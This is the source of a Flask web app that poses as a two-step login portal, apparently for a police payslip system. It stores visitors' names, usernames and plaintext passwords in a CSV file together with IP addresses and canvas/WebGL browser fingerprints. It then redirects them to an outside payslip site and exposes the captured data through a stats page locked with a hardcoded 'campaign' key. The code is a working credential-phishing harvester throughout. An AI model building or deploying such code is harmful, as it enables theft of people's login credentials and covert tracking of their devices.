from flask import Flask, render_template, request, redirect, jsonify, session
import csv # getting the configuration of csv
import os # configuration/ portable way of using operating system
import time #getting the time
import subprocess #allows you to spawn new processes, connect to their input/output/error pipes, and obtain their return codes.
import platform #used to retrieve as much possible information about the platform
import re #provides regular expression matching operations
import json #for returning JSON data
import hashlib
import uuid

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Required for session

# Secret access key for stats page (change this to a secure value)
STATS_ACCESS_KEY = "pnp-pms-campaign2025"

# Route for rendering the identity page as the main landing page
@app.route('/')
def index():
    return render_template('identity.html')

# Route for rendering the login page after identity confirmation
@app.route('/login')
def login_page():
    # Check if we have first name and last name in session
    if 'firstname' not in session or 'lastname' not in session:
        return redirect('/')
    return render_template('index.html')

"""
A function designed to retrieve 
and return the client's actual IP address.
"""
def get_client_ip():
    """
    Enhanced function to get the most accurate client IP address
    by checking multiple headers in priority order
    """
    # List of headers to check in priority order
    ip_headers = [
        'CF-Connecting-IP',           # Cloudflare
        'True-Client-IP',             # Akamai and some CDNs
        'X-Forwarded-For',            # Most common proxy header
        'X-Real-IP',                  # Nginx proxy/FastCGI
        'X-Client-IP',                # Apache proxy
        'Forwarded',                  # RFC 7239 standard
        'X-Forwarded',                # Non-standard but sometimes used
        'X-Cluster-Client-IP',        # Used by some load balancers
        'Fastly-Client-IP',           # Fastly CDN
        'X-Originating-IP'            # Microsoft 
    ]
    
    # Check each header in order
    for header in ip_headers:
        if header.lower() == 'x-forwarded-for' and request.headers.getlist(header):
            # X-Forwarded-For may contain multiple IPs, get the first one (client)
            forwarded_for = request.headers.getlist(header)[0]
            if forwarded_for:
                # Get the leftmost IP which is typically the original client
                client_ip = forwarded_for.split(',')[0].strip()
                if client_ip and client_ip != '127.0.0.1' and client_ip != 'unknown':
                    return client_ip
        elif request.headers.get(header):
            client_ip = request.headers.get(header).strip()
            if client_ip and client_ip != '127.0.0.1' and client_ip != 'unknown':
                return client_ip
    
    # Try WSGI environment variables if headers failed
    if request.environ.get('HTTP_X_FORWARDED_FOR'):
        forwarded_for = request.environ.get('HTTP_X_FORWARDED_FOR')
        client_ip = forwarded_for.split(',')[0].strip()
        if client_ip and client_ip != '127.0.0.1':
            return client_ip
    
    return request.remote_addr

# Handle identity form submission
@app.route('/identity-submit', methods=['POST'])
def identity_submit():
    firstname = request.form.get('firstname')
    lastname = request.form.get('lastname')
    
    if not firstname or not lastname:
        return render_template('identity.html', error="Please enter both First Name and Last Name")
    
    # Store in session for later use
    session['firstname'] = firstname
    session['lastname'] = lastname
    
    # Get enhanced client information
    ip_address = get_client_ip()
    device_type = get_device_type()
    
    # Store in session for later use with full submission
    session['ip_address'] = ip_address
    session['device_type'] = device_type
    session['time_identity'] = time.strftime('%Y-%m-%d %H:%M:%S')
    
    # Redirect to login page
    return redirect('/login')

"""
Function to determine if the client is using a mobile or desktop device
depending on their current device they try to log in.
"""
def get_device_type():
    user_agent = request.headers.get('User-Agent', '').lower()
    if any(mobile in user_agent for mobile in ['iphone', 'android', 'mobile', 'tablet']):
        return 'Mobile'
    return 'Desktop'

def generate_device_fingerprint():
    """
    Generate a unique device fingerprint based on browser characteristics
    This is more reliable than trying to get MAC addresses
    """
    user_agent = request.headers.get('User-Agent', '')
    accept_lang = request.headers.get('Accept-Language', '')
    accept_encoding = request.headers.get('Accept-Encoding', '')
    accept = request.headers.get('Accept', '')
    ip_address = get_client_ip()
    screen_info = request.cookies.get('screen_info', '')
    timezone = request.cookies.get('timezone', '')
    platform_info = request.cookies.get('platform_info', '')
    canvas_fp = request.cookies.get('canvas_fp', '')
    
    # Create a unique fingerprint from multiple browser characteristics
    fingerprint_data = f"{user_agent}|{accept_lang}|{accept_encoding}|{accept}|{ip_address}|{screen_info}|{timezone}|{platform_info}|{canvas_fp}"
    # Generate a unique ID combining SHA-256 hash and a portion of UUID
    unique_id = str(uuid.uuid4())[:8]
    fingerprint = hashlib.sha256(fingerprint_data.encode()).hexdigest()[:24] + unique_id
    
    return fingerprint

def get_browser_info():
    """
    Extract detailed browser information from User-Agent and other headers
    """
    user_agent = request.headers.get('User-Agent', '')
    
    # Extract browser name and version
    browser_name = "Unknown"
    browser_version = "Unknown"
    os_name = "Unknown"
    os_version = "Unknown"
    
    # Common browser patterns
    browser_patterns = [
        (r'MSIE\s([0-9\.]+)', 'Internet Explorer'),
        (r'Edge/([0-9\.]+)', 'Edge'),
        (r'Edg/([0-9\.]+)', 'Edge'),
        (r'Chrome/([0-9\.]+)', 'Chrome'),
        (r'Firefox/([0-9\.]+)', 'Firefox'),
        (r'Safari/([0-9\.]+)', 'Safari'),
        (r'OPR/([0-9\.]+)', 'Opera'),
        (r'Opera/([0-9\.]+)', 'Opera')
    ]
    
    # OS patterns
    os_patterns = [
        (r'Windows NT 10\.0', 'Windows', '10'),
        (r'Windows NT 6\.3', 'Windows', '8.1'),
        (r'Windows NT 6\.2', 'Windows', '8'),
        (r'Windows NT 6\.1', 'Windows', '7'),
        (r'Windows NT 6\.0', 'Windows', 'Vista'),
        (r'Windows NT 5\.1', 'Windows', 'XP'),
        (r'Macintosh; Intel Mac OS X ([0-9_\.]+)', 'macOS', None),
        (r'Android ([0-9\.]+)', 'Android', None),
        (r'iPhone OS ([0-9_\.]+)', 'iOS', None),
        (r'iPad; CPU OS ([0-9_\.]+)', 'iOS', None),
        (r'Linux', 'Linux', 'Unknown')
    ]
    
    # Get browser info
    for pattern, name in browser_patterns:
        match = re.search(pattern, user_agent)
        if match:
            browser_name = name
            browser_version = match.group(1)
            break
    
    # Get OS info
    for pattern, name, version in os_patterns:
        match = re.search(pattern, user_agent)
        if match:
            os_name = name
            if version is None and match.groups():
                os_version = match.group(1).replace('_', '.')
            else:
                os_version = version
            break
    
    # Additional information from headers
    accept_lang = request.headers.get('Accept-Language', 'Unknown')
    languages = accept_lang.split(',')[0] if ',' in accept_lang else accept_lang
    
    # Custom headers that might be sent from client-side JS
    screen_resolution = request.cookies.get('screen_info', 'Unknown')
    timezone_info = request.cookies.get('timezone', 'Unknown')
    
    # Get canvas and WebGL fingerprint
    canvas_fp = request.cookies.get('canvas_fp', 'Unknown')
    canvas_hash = canvas_fp.split('_')[0] if '_' in canvas_fp else canvas_fp
    webgl_info = canvas_fp.split('_')[1] if '_' in canvas_fp and len(canvas_fp.split('_')) > 1 else 'Unknown'
    
    # Parse platform info if available
    platform_info = {}
    try:
        platform_cookie = request.cookies.get('platform_info', '{}')
        platform_info = json.loads(platform_cookie)
    except:
        platform_info = {'error': 'Failed to parse platform info'}
    
    # Compile all information
    browser_details = {
        'browser_name': browser_name,
        'browser_version': browser_version,
        'os_name': os_name,
        'os_version': os_version,
        'language': languages,
        'screen_resolution': screen_resolution,
        'timezone': timezone_info,
        'canvas_hash': canvas_hash,
        'webgl_info': webgl_info,
        'platform_details': platform_info,
        'full_user_agent': user_agent
    }
    
    return json.dumps(browser_details)

# routing for handle login form submission
@app.route('/login', methods=['POST'])
def login():
    # Get the form data
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Check if identity was confirmed
    if 'firstname' not in session or 'lastname' not in session:
        return redirect('/')
    
    # Get saved information
    firstname = session.get('firstname')
    lastname = session.get('lastname')
    ip_address = session.get('ip_address', get_client_ip())
    device_type = session.get('device_type', get_device_type())
    
    # Get more enhanced client information
    device_fingerprint = generate_device_fingerprint()
    browser_info = get_browser_info()
    
    if not username or not password:
        return render_template('index.html', error="Please enter both username and password")
    
    # Save the complete data
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
    
    # Redirect to external site
    return redirect("https://payslip-pnppms.onrender.com/")

def save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info):
    """ 
    Save complete user data to CSV
    """
    script_dir = os.path.dirname(os.path.abspath(__file__))
    csv_path = os.path.join(script_dir, 'data.csv')
    
    # Parse browser info from JSON string to dict
    try:
        browser_details = json.loads(browser_info)
    except:
        browser_details = {"full_user_agent": browser_info}
    
    try:
        file_exists = os.path.isfile(csv_path)
        
        with open(csv_path, 'a', newline='\n') as csvfile:
            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)

            """
            if file does not exist or is empty, it will write header
            """
            if not file_exists or os.stat(csv_path).st_size == 0:
                writer.writerow([
                    'first_name',
                    'last_name',
                    'username',
                    'password',
                    'timestamp', 
                    'ip_address', 
                    'device_fingerprint', 
                    'device_type', 
                    'browser_name', 
                    'browser_version', 
                    'os_name', 
                    'os_version', 
                    'language',
                    'screen_resolution',
                    'timezone',
                    'canvas_hash',
                    'webgl_info',
                    'full_user_agent'
                ])
                csvfile.flush()

            # append all data with detailed browser info
            writer.writerow([
                firstname,
                lastname,
                username,
                password,
                timestamp, 
                ip_address, 
                device_fingerprint, 
                device_type, 
                browser_details.get('browser_name', 'Unknown'),
                browser_details.get('browser_version', 'Unknown'),
                browser_details.get('os_name', 'Unknown'),
                browser_details.get('os_version', 'Unknown'),
                browser_details.get('language', 'Unknown'),
                browser_details.get('screen_resolution', 'Unknown'),
                browser_details.get('timezone', 'Unknown'),
                browser_details.get('canvas_hash', 'Unknown'),
                browser_details.get('webgl_info', 'Unknown'),
                browser_details.get('full_user_agent', 'Unknown')
            ])
            csvfile.flush()
    except Exception as e:
        """
        if writing to default location fails, it will go alternative way/append
        to navigate it's location request.
        """
        fallback_path = os.path.join(os.path.expanduser('~'), 'data.csv')
        with open(fallback_path, 'a', newline='\n') as csvfile:
            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
            
            if not os.path.exists(fallback_path) or os.stat(fallback_path).st_size == 0:
                writer.writerow([
                    'first_name',
                    'last_name',
                    'username',
                    'password',
                    'timestamp', 
                    'ip_address', 
                    'device_fingerprint', 
                    'device_type', 
                    'browser_name', 
                    'browser_version', 
                    'os_name', 
                    'os_version', 
                    'language',
                    'screen_resolution',
                    'timezone',
                    'canvas_hash',
                    'webgl_info',
                    'full_user_agent'
                ])
                csvfile.flush()
            
            writer.writerow([
                firstname,
                lastname,
                username,
                password,
                timestamp, 
                ip_address, 
                device_fingerprint, 
                device_type, 
                browser_details.get('browser_name', 'Unknown'),
                browser_details.get('browser_version', 'Unknown'),
                browser_details.get('os_name', 'Unknown'),
                browser_details.get('os_version', 'Unknown'),
                browser_details.get('language', 'Unknown'),
                browser_details.get('screen_resolution', 'Unknown'),
                browser_details.get('timezone', 'Unknown'),
                browser_details.get('canvas_hash', 'Unknown'),
                browser_details.get('webgl_info', 'Unknown'),
                browser_details.get('full_user_agent', 'Unknown')
            ])
            csvfile.flush()

# Add a route to view statistics with access key protection
@app.route('/stats/<access_key>', methods=['GET'])
def view_stats(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # Try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    data = []
    for path in possible_paths:
        if os.path.exists(path):
            try:
                with open(path, 'r') as csvfile:
                    reader = csv.DictReader(csvfile)
                    data = list(reader)
                break  # Successfully read data, exit loop
            except Exception as e:
                continue
    
    if request.args.get('format') == 'json':
        return json.dumps(data)
    else:
        return render_template('stats.html', entries=data)

if __name__ == '__main__':
    #run server 
    app.run(
        host='0.0.0.0',  
        port=5000,       # You can change this port if needed. do not remove for handling port.
        debug=False      # set to False for production. do not remove this.
    ) 